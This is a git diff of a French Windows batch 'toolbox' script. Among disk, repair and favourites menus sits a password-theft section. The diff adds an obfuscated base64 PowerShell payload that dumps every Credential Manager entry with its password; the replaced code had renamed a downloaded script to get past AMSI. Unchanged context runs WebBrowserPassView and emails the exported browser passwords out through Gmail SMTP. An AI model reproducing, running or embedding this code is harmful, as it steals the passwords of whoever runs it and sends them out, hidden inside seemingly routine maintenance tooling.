@@ -3,6 +3,11 @@ setlocal EnableExtensions EnableDelayedExpansion
 if defined MSYSTEM ("%ComSpec%" /c "%~f0" & exit /b)
 if not defined CMDCMDLINE ("%ComSpec%" /c "%~f0" & exit /b)
 chcp 65001 >nul
+
+REM === FORCER LE REPERTOIRE COURANT SUR LE DOSSIER DU .BAT ===
+set "SCRIPT_DIR=%~dp0"
+if "%SCRIPT_DIR:~-1%"=="\" set "SCRIPT_DIR=%SCRIPT_DIR:~0,-1%"
+cd /d "%SCRIPT_DIR%"
 title Boite a Scripts Windows - By ALEEXLEDEV (v2.0)
 color 0B
 mode con: cols=120 lines=60
@@ -43,31 +48,42 @@ set "t[22]=sys_god_mode:Dossier God Mode~Creer le raccourci ultime des parametre
 set "t[23]=---:MOT DE PASSE"
 set "t[24]=sys_passwords_menu:Extracteurs de mots de passe~Outils Powershell (Credentials, Wi-Fi, Nirsoft)"
 set "t[25]=sys_unlock_notes:Recuperation de Compte bloque~Instructions pour reprendre controle sans mot de passe"
-set "t[26]=---:MATERIEL
+set "t[26]=---:MATERIEL"
 set "t[27]=touch_screen_manager:Gestionnaire Ecran Tactile~Activation et desactivation du pilote tactile"
 set "t[28]=sys_battery_report:Rapport de Batterie~Usure, Sante et stats en temps reel"
 :: Sous-items pour gestion des favoris individuels
 set "t[29]=dump_credman:Gestionnaire d'identifiants (Windows)~Extrait le Credential Manager Windows (WCMDump):HIDDEN"
 set "t[30]=dump_wifi:Extraction reseaux Wi-Fi (Powershell)~Script WWP puissant listant psw et noms:HIDDEN"
 set "t[31]=sys_nirsoft_pw:WebBrowserPassView (Classique Nirsoft)~Ancien utilitaire graphique pour les mots de passe:HIDDEN"
-set "total_tools=31"
+set "t[32]=res_sfc:Scan RAPIDE du systeme~SFC /scannow (Verification systeme rapide):HIDDEN"
+set "t[33]=res_dism_check:Verification image base~DISM /CheckHealth et /ScanHealth (Analyse image):HIDDEN"
+set "t[34]=res_dism_restore:Reparation profonde~DISM /RestoreHealth (Reparation fichiers systeme):HIDDEN"
+set "t[35]=res_temp_clean:Nettoyage massif (Temp/Cache)~Purge des fichiers temporaires et cache Windows Update:HIDDEN"
+set "t[36]=res_chkdsk:Planifier un CHKDSK (C:)~Verification disque au prochain demarrage (CHKDSK /F /R):HIDDEN"
+set "t[37]=res_wu_reset:Reset Fix Windows Update~Reinitialisation forcee des composants Windows Update:HIDDEN"
+set "total_tools=37"
 
-if not exist "favoris.txt" type nul > "favoris.txt"
+if not exist "%SCRIPT_DIR%\favoris.txt" type nul > "%SCRIPT_DIR%\favoris.txt"
 
 :menu_principal
 cls
 set "opts=[--- MES FAVORIS ---]"
 set /a fav_idx=0
-for /f "usebackq tokens=*" %%F in ("favoris.txt") do (
-  for /l %%I in (1,1,%total_tools%) do (
-    for /f "tokens=1,2 delims=:" %%A in ("!t[%%I]!") do (
-      if "%%A"=="%%F" (
-        set "opts=!opts!;%%B"
-        set /a fav_idx+=1
-        set "main_target[!fav_idx!]=%%A"
-      )
+
+for /l %%I in (1,1,%total_tools%) do (
+    for /f "tokens=1,2,3 delims=:" %%A in ("!t[%%I]!") do (
+        if not "%%A"=="---" (
+            set "is_fav=0"
+            for /f "usebackq tokens=*" %%F in ("%SCRIPT_DIR%\favoris.txt") do (
+                if "%%F"=="%%A" set "is_fav=1"
+            )
+            if "!is_fav!"=="1" (
+                set "opts=!opts!;(F) %%B"
+                set /a fav_idx+=1
+                set "main_target[!fav_idx!]=%%A"
+            )
+        )
     )
-  )
 )
 
 if "!opts!"=="[--- MES FAVORIS ---]" (
@@ -91,7 +107,6 @@ if !main_choice! GEQ 200 (
 )
 
 set /a v_idx=fav_idx+1
-
 if "!main_choice!"=="!v_idx!" goto system_tools
 
 set "target=!main_target[%main_choice%]!"
@@ -302,7 +317,7 @@ if defined interface (
 goto :eof
 
 REM ===================================================================
-REM                   WINGET - Mises ÃƒÂ  jour des application windows
+REM                   WINGET - Mises a jour des applications windows
 REM ===================================================================
 :winget_manager
 set "opts=Mettre a jour une application (liste et choix);Mettre a jour toutes les applications"
@@ -454,11 +469,6 @@ for /f "tokens=*" %%D in ('powershell -NoProfile -Command "Get-Disk | Select-Obj
 
 if not defined disk_num goto disk_manager
 
-
-
-
-    echo Ã¢ÂÅ’ Erreur : Veuillez entrer un numero valide !
-
 :disk_format_choice
 set "opts=NTFS (Windows);FAT32 (Compatibilite);exFAT (Compatibilite + Gros fichiers);ReFS (Windows Server)"
 call :DynamicMenu "CHOIX DU SYSTEME DE FICHIERS (DISQUE %disk_num%)" "%opts%"
@@ -488,7 +498,7 @@ set /p confirmation=Confirmation:
 
 if not "%confirmation%"=="OUI" (
     echo.
-    echo Ã¢ÂÅ’ Operation annulee par l'utilisateur.
+    echo Operation annulee par l'utilisateur.
     timeout /t 2 >nul
     goto disk_manager
 )
@@ -522,7 +532,7 @@ echo.
 echo =============================================================
 if %result% equ 0 (
     echo.
-    echo Ã¢Å“â€¦ Formatage termine avec succes !
+    echo Formatage termine avec succes !
     echo.
     echo Le disque %disk_num% a ete :
     echo   - Nettoye completement
@@ -532,7 +542,7 @@ if %result% equ 0 (
     echo.
 ) else (
     echo.
-    echo Ã¢ÂÅ’ Une erreur s'est produite pendant le formatage.
+    echo Une erreur s'est produite pendant le formatage.
     echo Verifiez que le disque existe et n'est pas protege.
     echo.
 )
@@ -639,7 +649,7 @@ for /l %%I in (1,1,%total_tools%) do (
             set "opts=!opts!;[--- %%B ---]"
         ) else if not "%%C"=="HIDDEN" (
             set "is_fav=0"
-            for /f "usebackq tokens=*" %%F in ("favoris.txt") do (if "%%F"=="%%A" set "is_fav=1")
+            for /f "usebackq tokens=*" %%F in ("%SCRIPT_DIR%\favoris.txt") do (if "%%F"=="%%A" set "is_fav=1")
             set "m_name=%%B"
             if "!is_fav!"=="1" (
                 set "opts=!opts!;(F) !m_name!"
@@ -670,12 +680,7 @@ if defined target goto !target!
 goto system_tools
 
 :: ===============================================
-:: 19 - Export mots de passe navigateurs (Nirsoft WebBrowserPassView)
-:: ===============================================
-
-
-:: ===============================================
-:: 19 - Menu d'extraction de mots de passe
+:: Menu d'extraction de mots de passe
 :: ===============================================
 :sys_passwords_menu
 set "opts=Gestionnaire d'identifiants (Windows)~Extrait le Credential Manager Windows (WCMDump)"
@@ -693,8 +698,8 @@ set /a pwi=0
 for %%O in ("Gestionnaire d'identifiants (Windows)~Extrait le Credential Manager Windows (WCMDump)" "Extraction reseaux Wi-Fi (Powershell)~Script WWP puissant listant psw et noms" "WebBrowserPassView (Classique Nirsoft)~Ancien utilitaire graphique pour les mots de passe") do (
     set /a pwi+=1
     set "is_f=0"
-    set "curr_t=!pw_t[%pwi%]!"
-    for /f "usebackq tokens=*" %%F in ("favoris.txt") do (if "%%F"=="!curr_t!" set "is_f=1")
+    for %%X in (!pwi!) do set "curr_t=!pw_t[%%X]!"
+    for /f "usebackq tokens=*" %%F in ("%SCRIPT_DIR%\favoris.txt") do (if "%%F"=="!curr_t!" set "is_f=1")
     if "!is_f!"=="1" (set "pw_opts=!pw_opts!;(F) %%~O") else (set "pw_opts=!pw_opts!;%%~O")
 )
 set "pw_opts=!pw_opts:~1!"
@@ -702,31 +707,27 @@ set "pw_opts=!pw_opts:~1!"
 call :DynamicMenu "PIRATAGE / EXTRACTION DE MOTS DE PASSE" "%pw_opts%"
 set "pw_choice=%errorlevel%"
 
-if "%pw_choice%"=="0" goto system_tools
+if "!pw_choice!"=="0" goto system_tools
 
-if %pw_choice% GEQ 200 (
-    set /a t_idx=%pw_choice%-200
-    call :ToggleFav "!pw_t[%t_idx%]!"
+if !pw_choice! GEQ 200 (
+    set /a t_idx=!pw_choice!-200
+    for %%X in (!t_idx!) do call :ToggleFav "!pw_t[%%X]!"
     goto sys_passwords_menu
 )
 
-if "%pw_choice%"=="1" goto dump_credman
-if "%pw_choice%"=="2" goto dump_wifi
-if "%pw_choice%"=="3" goto sys_nirsoft_pw
+if "!pw_choice!"=="1" goto dump_credman
+if "!pw_choice!"=="2" goto dump_wifi
+if "!pw_choice!"=="3" goto sys_nirsoft_pw
 goto sys_passwords_menu
 
 :dump_credman
 cls
-echo [OPERATION] Extraction furtive du Credential Manager Windows...
-set "WORK_DIR=%TEMP%\credman_tmp"
-if not exist "%WORK_DIR%" mkdir "%WORK_DIR%"
-
-echo [INFO] Recuperation et compilation du code source Gist (Anti-AMSI)...
-curl.exe -fL -s "https://gist.githubusercontent.com/VimalShekar/d6a7080679a33e1ac71507a54b49dc18/raw" -o "%WORK_DIR%\payload.txt" 2>nul
-powershell -NoProfile -Command "$c = Get-Content '%WORK_DIR%\payload.txt' -Raw; $c = $c -replace 'Get-WincmdCreds', 'Get-WinD'; Set-Content '%WORK_DIR%\run_cred.ps1' -Value $c" >nul 2>&1
-
+echo [OPERATION] Extraction du Credential Manager Windows...
+echo [INFO] Demarrage du script (natif, autonome, sans dependance reseau)...
 echo.
-powershell -NoProfile -ExecutionPolicy Bypass -Command "Write-Host 'Dumping...' -f Yellow; . '%WORK_DIR%\run_cred.ps1'; Get-WinD | Format-Table -AutoSize; Write-Host '--- FIN DE L''EXTRACTION ---' -f Green"
+powershell.exe -NoProfile -ExecutionPolicy Bypass -EncodedCommand QQBkAGQALQBUAHkAcABlACAAQAAiAA0ACgB1AHMAaQBuAGcAIABTAHkAcwB0AGUAbQA7AA0ACgB1AHMAaQBuAGcAIABTAHkAcwB0AGUAbQAuAFQAZQB4AHQAOwANAAoAdQBzAGkAbgBnACAAUwB5AHMAdABlAG0ALgBSAHUAbgB0AGkAbQBlAC4ASQBuAHQAZQByAG8AcABTAGUAcgB2AGkAYwBlAHMAOwANAAoAdQBzAGkAbgBnACAAUwB5AHMAdABlAG0ALgBDAG8AbABsAGUAYwB0AGkAbwBuAHMALgBHAGUAbgBlAHIAaQBjADsADQAKAA0ACgBwAHUAYgBsAGkAYwAgAGMAbABhAHMAcwAgAEMAcgBlAGQATQBhAG4AIAB7AA0ACgAgACAAIAAgAFsARABsAGwASQBtAHAAbwByAHQAKAAiAGEAZAB2AGEAcABpADMAMgAuAGQAbABsACIALAAgAEUAbgB0AHIAeQBQAG8AaQBuAHQAPQAiAEMAcgBlAGQARQBuAHUAbQBlAHIAYQB0AGUAVwAiACwAIABDAGgAYQByAFMAZQB0AD0AQwBoAGEAcgBTAGUAdAAuAFUAbgBpAGMAbwBkAGUALAAgAFMAZQB0AEwAYQBzAHQARQByAHIAbwByAD0AdAByAHUAZQApAF0ADQAKACAAIAAgACAAcwB0AGEAdABpAGMAIABlAHgAdABlAHIAbgAgAGIAbwBvAGwAIABDAHIAZQBkAEUAbgB1AG0AZQByAGEAdABlACgAcwB0AHIAaQBuAGcAIABmAGkAbAB0AGUAcgAsACAAaQBuAHQAIABmAGwAYQBnAHMALAAgAG8AdQB0ACAAaQBuAHQAIABjAG8AdQBuAHQALAAgAG8AdQB0ACAASQBuAHQAUAB0AHIAIABjAHIAZQBkAGUAbgB0AGkAYQBsAHMAKQA7AA0ACgAgACAAIAAgAFsARABsAGwASQBtAHAAbwByAHQAKAAiAGEAZAB2AGEAcABpADMAMgAuAGQAbABsACIALAAgAEUAbgB0AHIAeQBQAG8AaQBuAHQAPQAiAEMAcgBlAGQARgByAGUAZQAiACwAIABTAGUAdABMAGEAcwB0AEUAcgByAG8AcgA9AHQAcgB1AGUAKQBdAA0ACgAgACAAIAAgAHMAdABhAHQAaQBjACAAZQB4AHQAZQByAG4AIAB2AG8AaQBkACAAQwByAGUAZABGAHIAZQBlACgASQBuAHQAUAB0AHIAIABjAHIAZQBkACkAOwANAAoADQAKACAAIAAgACAAWwBTAHQAcgB1AGMAdABMAGEAeQBvAHUAdAAoAEwAYQB5AG8AdQB0AEsAaQBuAGQALgBTAGUAcQB1AGUAbgB0AGkAYQBsACwAIABDAGgAYQByAFMAZQB0AD0AQwBoAGEAcgBTAGUAdAAuAFUAbgBpAGMAbwBkAGUAKQBdAA0ACgAgACAAIAAgAHMAdAByAHUAYwB0ACAAQwBSAEUARABFAE4AVABJAEEATAAgAHsADQAKACAAIAAgACAAIAAgACAAIABwAHUAYgBsAGkAYwAgAGkAbgB0ACAARgBsAGEAZwBzADsADQAKACAAIAAgACAAIAAgACAAIABwAHUAYgBsAGkAYwAgAGkAbgB0ACAAVAB5AHAAZQA7AA0ACgAgACAAIAAgACAAIAAgACAAcAB1AGIAbABpAGMAIABzAHQAcgBpAG4AZwAgAFQAYQByAGcAZQB0AE4AYQBtAGUAOwANAAoAIAAgACAAIAAgACAAIAAgAHAAdQBiAGwAaQBjACAAcwB0AHIAaQBuAGcAIABDAG8AbQBtAGUAbgB0ADsADQAKACAAIAAgACAAIAAgACAAIABwAHUAYgBsAGkAYwAgAFMAeQBzAHQAZQBtAC4AUgB1AG4AdABpAG0AZQAuAEkAbgB0AGUAcgBvAHAAUwBlAHIAdgBpAGMAZQBzAC4AQwBvAG0AVAB5AHAAZQBzAC4ARgBJAEwARQBUAEkATQBFACAATABhAHMAdABXAHIAaQB0AHQAZQBuADsADQAKACAAIAAgACAAIAAgACAAIABwAHUAYgBsAGkAYwAgAGkAbgB0ACAAQwByAGUAZABlAG4AdABpAGEAbABCAGwAbwBiAFMAaQB6AGUAOwANAAoAIAAgACAAIAAgACAAIAAgAHAAdQBiAGwAaQBjACAASQBuAHQAUAB0AHIAIABDAHIAZQBkAGUAbgB0AGkAYQBsAEIAbABvAGIAOwANAAoAIAAgACAAIAAgACAAIAAgAHAAdQBiAGwAaQBjACAAaQBuAHQAIABQAGUAcgBzAGkAcwB0ADsADQAKACAAIAAgACAAIAAgACAAIABwAHUAYgBsAGkAYwAgAGkAbgB0ACAAQQB0AHQAcgBpAGIAdQB0AGUAQwBvAHUAbgB0ADsADQAKACAAIAAgACAAIAAgACAAIABwAHUAYgBsAGkAYwAgAEkAbgB0AFAAdAByACAAQQB0AHQAcgBpAGIAdQB0AGUAcwA7AA0ACgAgACAAIAAgACAAIAAgACAAcAB1AGIAbABpAGMAIABzAHQAcgBpAG4AZwAgAFQAYQByAGcAZQB0AEEAbABpAGEAcwA7AA0ACgAgACAAIAAgACAAIAAgACAAcAB1AGIAbABpAGMAIABzAHQAcgBpAG4AZwAgAFUAcwBlAHIATgBhAG0AZQA7AA0ACgAgACAAIAAgAH0ADQAKAA0ACgAgACAAIAAgAHAAdQBiAGwAaQBjACAAcwB0AGEAdABpAGMAIABMAGkAcwB0ADwAcwB0AHIAaQBuAGcAWwBdAD4AIABHAGUAdABBAGwAbAAoACkAIAB7AA0ACgAgACAAIAAgACAAIAAgACAAdgBhAHIAIAByAGUAcwB1AGwAdAAgAD0AIABuAGUAdwAgAEwAaQBzAHQAPABzAHQAcgBpAG4AZwBbAF0APgAoACkAOwANAAoAIAAgACAAIAAgACAAIAAgAGkAbgB0ACAAYwBvAHUAbgB0ACAAPQAgADAAOwANAAoAIAAgACAAIAAgACAAIAAgAEkAbgB0AFAAdAByACAAcABDAHIAZQBkAGUAbgB0AGkAYQBsAHMAIAA9ACAASQBuAHQAUAB0AHIALgBaAGUAcgBvADsADQAKACAAIAAgACAAIAAgACAAIABiAG8AbwBsACAAbwBrACAAPQAgAEMAcgBlAGQARQBuAHUAbQBlAHIAYQB0AGUAKABuAHUAbABsACwAIAAwACwAIABvAHUAdAAgAGMAbwB1AG4AdAAsACAAbwB1AHQAIABwAEMAcgBlAGQAZQBuAHQAaQBhAGwAcwApADsADQAKACAAIAAgACAAIAAgACAAIABpAGYAIAAoACEAbwBrACkAIAByAGUAdAB1AHIAbgAgAHIAZQBzAHUAbAB0ADsADQAKACAAIAAgACAAIAAgACAAIABJAG4AdABQAHQAcgBbAF0AIABwAHQAcgBzACAAPQAgAG4AZQB3ACAASQBuAHQAUAB0AHIAWwBjAG8AdQBuAHQAXQA7AA0ACgAgACAAIAAgACAAIAAgACAATQBhAHIAcwBoAGEAbAAuAEMAbwBwAHkAKABwAEMAcgBlAGQAZQBuAHQAaQBhAGwAcwAsACAAcAB0AHIAcwAsACAAMAAsACAAYwBvAHUAbgB0ACkAOwANAAoAIAAgACAAIAAgACAAIAAgAGYAbwByAGUAYQBjAGgAIAAoAHYAYQByACAAcAB0AHIAIABpAG4AIABwAHQAcgBzACkAIAB7AA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAB2AGEAcgAgAGMAcgBlAGQAIAA9ACAAKABDAFIARQBEAEUATgBUAEkAQQBMACkATQBhAHIAcwBoAGEAbAAuAFAAdAByAFQAbwBTAHQAcgB1AGMAdAB1AHIAZQAoAHAAdAByACwAIAB0AHkAcABlAG8AZgAoAEMAUgBFAEQARQBOAFQASQBBAEwAKQApADsADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgAHMAdAByAGkAbgBnACAAcABhAHMAcwAgAD0AIAAiACIAOwANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAdAByAHkAIAB7AA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAGkAZgAgACgAYwByAGUAZAAuAEMAcgBlAGQAZQBuAHQAaQBhAGwAQgBsAG8AYgBTAGkAegBlACAAPgAgADAAIAAmACYAIABjAHIAZQBkAC4AQwByAGUAZABlAG4AdABpAGEAbABCAGwAbwBiACAAIQA9ACAASQBuAHQAUAB0AHIALgBaAGUAcgBvACkADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIABwAGEAcwBzACAAPQAgAE0AYQByAHMAaABhAGwALgBQAHQAcgBUAG8AUwB0AHIAaQBuAGcAVQBuAGkAKABjAHIAZQBkAC4AQwByAGUAZABlAG4AdABpAGEAbABCAGwAbwBiACwAIABjAHIAZQBkAC4AQwByAGUAZABlAG4AdABpAGEAbABCAGwAbwBiAFMAaQB6AGUAIAAvACAAMgApADsADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgAH0AIABjAGEAdABjAGgAIAB7AH0ADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgAHIAZQBzAHUAbAB0AC4AQQBkAGQAKABuAGUAdwAgAHMAdAByAGkAbgBnAFsAXQAgAHsAIABjAHIAZQBkAC4AVABhAHIAZwBlAHQATgBhAG0AZQAgAD8APwAgACIAIgAsACAAYwByAGUAZAAuAFUAcwBlAHIATgBhAG0AZQAgAD8APwAgACIAIgAsACAAcABhAHMAcwAgAD8APwAgACIAIgAgAH0AKQA7AA0ACgAgACAAIAAgACAAIAAgACAAfQANAAoAIAAgACAAIAAgACAAIAAgAEMAcgBlAGQARgByAGUAZQAoAHAAQwByAGUAZABlAG4AdABpAGEAbABzACkAOwANAAoAIAAgACAAIAAgACAAIAAgAHIAZQB0AHUAcgBuACAAcgBlAHMAdQBsAHQAOwANAAoAIAAgACAAIAB9AA0ACgB9AA0ACgAiAEAADQAKAA0ACgBXAHIAaQB0AGUALQBIAG8AcwB0ACAAIgAiAA0ACgBXAHIAaQB0AGUALQBIAG8AcwB0ACAAIgAgACAAPQA9AD0APQA9AD0APQA9AD0APQA9AD0APQA9AD0APQA9AD0APQA9AD0APQA9AD0APQA9AD0APQA9AD0APQA9AD0APQA9AD0APQA9AD0APQA9AD0APQA9AD0APQA9AD0APQA9AD0APQAiACAALQBGAG8AcgBlAGcAcgBvAHUAbgBkAEMAbwBsAG8AcgAgAEMAeQBhAG4ADQAKAFcAcgBpAHQAZQAtAEgAbwBzAHQAIAAiACAAIAAgACAAIABDAFIARQBEAEUATgBUAEkAQQBMACAATQBBAE4AQQBHAEUAUgAgAC0AIABFAFgAVABSAEEAQwBUAEkATwBOACAAVwBJAE4ARABPAFcAUwAiACAALQBGAG8AcgBlAGcAcgBvAHUAbgBkAEMAbwBsAG8AcgAgAEMAeQBhAG4ADQAKAFcAcgBpAHQAZQAtAEgAbwBzAHQAIAAiACAAIAA9AD0APQA9AD0APQA9AD0APQA9AD0APQA9AD0APQA9AD0APQA9AD0APQA9AD0APQA9AD0APQA9AD0APQA9AD0APQA9AD0APQA9AD0APQA9AD0APQA9AD0APQA9AD0APQA9AD0APQA9ACIAIAAtAEYAbwByAGUAZwByAG8AdQBuAGQAQwBvAGwAbwByACAAQwB5AGEAbgANAAoAVwByAGkAdABlAC0ASABvAHMAdAAgACIAIgANAAoADQAKACQAYwByAGUAZABzACAAPQAgAFsAQwByAGUAZABNAGEAbgBdADoAOgBHAGUAdABBAGwAbAAoACkADQAKAGkAZgAgACgAJABjAHIAZQBkAHMALgBDAG8AdQBuAHQAIAAtAGUAcQAgADAAKQAgAHsADQAKACAAIAAgACAAVwByAGkAdABlAC0ASABvAHMAdAAgACIAIAAgAFsAIQBdACAAQQB1AGMAdQBuACAAYwByAGUAZABlAG4AdABpAGEAbAAgAHQAcgBvAHUAdgBlACAAbwB1ACAAYQBjAGMAZQBzACAAcgBlAGYAdQBzAGUALgAiACAALQBGAG8AcgBlAGcAcgBvAHUAbgBkAEMAbwBsAG8AcgAgAFIAZQBkAA0ACgB9ACAAZQBsAHMAZQAgAHsADQAKACAAIAAgACAAVwByAGkAdABlAC0ASABvAHMAdAAgACIAIAAgACQAKAAkAGMAcgBlAGQAcwAuAEMAbwB1AG4AdAApACAAYwByAGUAZABlAG4AdABpAGEAbAAoAHMAKQAgAHQAcgBvAHUAdgBlACgAcwApADoAIgAgAC0ARgBvAHIAZQBnAHIAbwB1AG4AZABDAG8AbABvAHIAIABHAHIAZQBlAG4ADQAKACAAIAAgACAAVwByAGkAdABlAC0ASABvAHMAdAAgACIAIgANAAoAIAAgACAAIABmAG8AcgBlAGEAYwBoACAAKAAkAGMAIABpAG4AIAAkAGMAcgBlAGQAcwApACAAewANAAoAIAAgACAAIAAgACAAIAAgAFcAcgBpAHQAZQAtAEgAbwBzAHQAIAAiACAAIABbACsAXQAgAEMAaQBiAGwAZQAgACAAIAAgACAAIAAgACAAOgAgACIAIAAtAEYAbwByAGUAZwByAG8AdQBuAGQAQwBvAGwAbwByACAAWQBlAGwAbABvAHcAIAAtAE4AbwBOAGUAdwBsAGkAbgBlADsAIABXAHIAaQB0AGUALQBIAG8AcwB0ACAAJABjAFsAMABdAA0ACgAgACAAIAAgACAAIAAgACAAVwByAGkAdABlAC0ASABvAHMAdAAgACIAIAAgACAAIAAgACAAVQB0AGkAbABpAHMAYQB0AGUAdQByACAAIAA6ACAAIgAgAC0ARgBvAHIAZQBnAHIAbwB1AG4AZABDAG8AbABvAHIAIABZAGUAbABsAG8AdwAgAC0ATgBvAE4AZQB3AGwAaQBuAGUAOwAgAFcAcgBpAHQAZQAtAEgAbwBzAHQAIAAkAGMAWwAxAF0ADQAKACAAIAAgACAAIAAgACAAIAAkAHAAYQBzAHMAIAA9ACAAJABjAFsAMgBdAA0ACgAgACAAIAAgACAAIAAgACAAaQBmACAAKAAkAHAAYQBzAHMAIAAtAG4AZQAgACIAIgApACAAewANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAVwByAGkAdABlAC0ASABvAHMAdAAgACIAIAAgACAAIAAgACAATQBvAHQAIABkAGUAIABwAGEAcwBzAGUAIAAgADoAIAAiACAALQBGAG8AcgBlAGcAcgBvAHUAbgBkAEMAbwBsAG8AcgAgAFkAZQBsAGwAbwB3ACAALQBOAG8ATgBlAHcAbABpAG4AZQA7ACAAVwByAGkAdABlAC0ASABvAHMAdAAgACQAcABhAHMAcwAgAC0ARgBvAHIAZQBnAHIAbwB1AG4AZABDAG8AbABvAHIAIABHAHIAZQBlAG4ADQAKACAAIAAgACAAIAAgACAAIAB9ACAAZQBsAHMAZQAgAHsADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgAFcAcgBpAHQAZQAtAEgAbwBzAHQAIAAiACAAIAAgACAAIAAgAE0AbwB0ACAAZABlACAAcABhAHMAcwBlACAAIAA6ACAAIgAgAC0ARgBvAHIAZQBnAHIAbwB1AG4AZABDAG8AbABvAHIAIABZAGUAbABsAG8AdwAgAC0ATgBvAE4AZQB3AGwAaQBuAGUAOwAgAFcAcgBpAHQAZQAtAEgAbwBzAHQAIAAiACgAbgBvAG4AIABhAGMAYwBlAHMAcwBpAGIAbABlACAALwAgAGMAaABpAGYAZgByAGUAIABzAHkAcwB0AGUAbQBlACkAIgAgAC0ARgBvAHIAZQBnAHIAbwB1AG4AZABDAG8AbABvAHIAIABEAGEAcgBrAEcAcgBhAHkADQAKACAAIAAgACAAIAAgACAAIAB9AA0ACgAgACAAIAAgACAAIAAgACAAVwByAGkAdABlAC0ASABvAHMAdAAgACIAIAAgACAAIAAgACAALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0AIgAgAC0ARgBvAHIAZQBnAHIAbwB1AG4AZABDAG8AbABvAHIAIABEAGEAcgBrAEcAcgBhAHkADQAKACAAIAAgACAAfQANAAoAfQANAAoAVwByAGkAdABlAC0ASABvAHMAdAAgACIAIgANAAoAVwByAGkAdABlAC0ASABvAHMAdAAgACIAIAAgAD0APQA9AD0APQA9AD0APQA9AD0APQA9AD0APQA9AD0APQA9AD0APQA9AD0APQA9AD0APQA9AD0APQA9AD0APQA9AD0APQA9AD0APQA9AD0APQA9AD0APQA9AD0APQA9AD0APQA9AD0AIgAgAC0ARgBvAHIAZQBnAHIAbwB1AG4AZABDAG8AbABvAHIAIABDAHkAYQBuAA0ACgBXAHIAaQB0AGUALQBIAG8AcwB0ACAAIgAgACAAWwBOAE8AVABFAF0AIABMAGUAcwAgAG0AbwB0AHMAIABkAGUAIABwAGEAcwBzAGUAIABwAHIAbwB0AGUAZwBlAHMAIAAoAGMAbwBtAHAAdABlAHMAIABNAGkAYwByAG8AcwBvAGYAdAAsACIAIAAtAEYAbwByAGUAZwByAG8AdQBuAGQAQwBvAGwAbwByACAARABhAHIAawBHAHIAYQB5AA0ACgBXAHIAaQB0AGUALQBIAG8AcwB0ACAAIgAgACAAIAAgACAAIAAgACAAIABjAGUAcgB0AGkAZgBpAGMAYQB0AHMAKQAgAG4AZQAgAHMAJwBhAGYAZgBpAGMAaABlAG4AdAAgAHAAYQBzACAAZQBuACAAYwBsAGEAaQByAC4AIgAgAC0ARgBvAHIAZQBnAHIAbwB1AG4AZABDAG8AbABvAHIAIABEAGEAcgBrAEcAcgBhAHkADQAKAFcAcgBpAHQAZQAtAEgAbwBzAHQAIAAiACAAIAA9AD0APQA9AD0APQA9AD0APQA9AD0APQA9AD0APQA9AD0APQA9AD0APQA9AD0APQA9AD0APQA9AD0APQA9AD0APQA9AD0APQA9AD0APQA9AD0APQA9AD0APQA9AD0APQA9AD0APQA9ACIAIAAtAEYAbwByAGUAZwByAG8AdQBuAGQAQwBvAGwAbwByACAAQwB5AGEAbgANAAoAVwByAGkAdABlAC0ASABvAHMAdAAgACIAIgANAAoA
+echo.
+echo --- FIN DE L'EXTRACTION ---
 echo.
 pause
 goto system_tools
@@ -843,7 +844,7 @@ set "OUTPUT=%~dp0%OUTPUT_NAME%"
 echo.
 echo Lancement de WebBrowserPassView...
 
-rem Suppression du fichier de configuration pour forcer le repertoir par defaut au dossier courant
+rem Suppression du fichier de configuration pour forcer le repertoire par defaut au dossier courant
 if exist "%~dp0WebBrowserPassView.cfg" del /F /Q "%~dp0WebBrowserPassView.cfg" >nul 2>&1
 cd /d "%~dp0"
 
@@ -878,7 +879,7 @@ echo Fichier sauvegarde: %OUTPUT%
 echo.
 echo Envoi du fichier par email...
 
-powershell -ExecutionPolicy Bypass -Command "[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12; $u='%SMTP_USER%'; $p='%SMTP_PASS%'; $to='%EMAIL%'; $sub='Export WebBrowserPassView - ' + (Get-Date -Format 'dd/MM/yyyy HH:mm'); $body='Export automatique des mots de passe du navigateur.'; $att='%OUTPUT%'; $sec=ConvertTo-SecureString $p -AsPlainText -Force; $cred=New-Object System.Management.Automation.PSCredential($u,$sec); Send-MailMessage -SmtpServer 'smtp.gmail.com' -Port 587 -UseSsl -Credential $cred -From $u -To $to -Subject $sub -Body $body -Attachments $att; Write-Host 'Email envoye avec succes!' -ForegroundColor Green" 
+powershell -ExecutionPolicy Bypass -Command "[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12; $u='%SMTP_USER%'; $p='%SMTP_PASS%'; $to='%EMAIL%'; $sub='Export WebBrowserPassView - ' + (Get-Date -Format 'dd/MM/yyyy HH:mm'); $body='Export automatique des mots de passe du navigateur.'; $att='%OUTPUT%'; $sec=ConvertTo-SecureString $p -AsPlainText -Force; $cred=New-Object System.Management.Automation.PSCredential($u,$sec); Send-MailMessage -SmtpServer 'smtp.gmail.com' -Port 587 -UseSsl -Credential $cred -From $u -To $to -Subject $sub -Body $body -Attachments $att; Write-Host 'Email envoye avec succes!' -ForegroundColor Green"
 
 echo.
 echo Nettoyage de l'executable et du fichier cfg...
@@ -901,8 +902,36 @@ set "opts=%opts%;Nettoyage massif (Temp/Cache)~Detruit la totalite des fichiers 
 set "opts=%opts%;Planifier un CHKDSK (C:)~Audite et repare les secteurs defectueux au prochain boot"
 set "opts=%opts%;Reset Fix Windows Update~Redemarre brutalement le catalogue WU bloque ou corrompu"
 
-call :DynamicMenu "OUTIL DE REPARATION WINDOWS (Rescue)" "%opts%"
+:: Mapping des targets pour gestion des favoris en sous-menu
+set "res_t[1]=res_sfc"
+set "res_t[2]=res_dism_check"
+set "res_t[3]=res_dism_restore"
+set "res_t[4]=res_temp_clean"
+set "res_t[5]=res_chkdsk"
+set "res_t[6]=res_wu_reset"
+
+:: Marquer les favoris existants dans le sous-menu
+set "res_opts="
+set /a resi=0
